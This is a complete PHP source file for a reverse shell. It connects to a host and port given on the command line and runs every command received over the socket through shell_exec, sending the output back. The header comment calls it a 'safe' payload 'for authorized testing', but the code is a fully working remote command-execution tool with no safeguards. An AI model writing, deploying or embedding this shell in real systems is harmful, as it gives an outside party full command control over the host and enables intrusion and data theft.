<?php
/**
 * PHP Reverse Shell
 * Safe reverse shell payload for authorized testing
 */

$host = $argv[1] ?? '';
$port = $argv[2] ?? '';

if (empty($host) || empty($port)) {
    echo "Usage: php php_shell.php <host> <port>\n";
    exit(1);
}

echo "Connecting to $host:$port\n";

$sock = fsockopen($host, $port, $errno, $errstr, 30);

if (!$sock) {
    echo "Connection failed: $errstr ($errno)\n";
    exit(1);
}

fwrite($sock, "PHP Reverse Shell Connected\n");

while (true) {
    $command = fgets($sock, 1024);
    
    if (trim($command) === 'exit' || trim($command) === 'quit') {
        break;
    }
    
    $output = shell_exec($command);
    fwrite($sock, $output);
}

fclose($sock);
?>
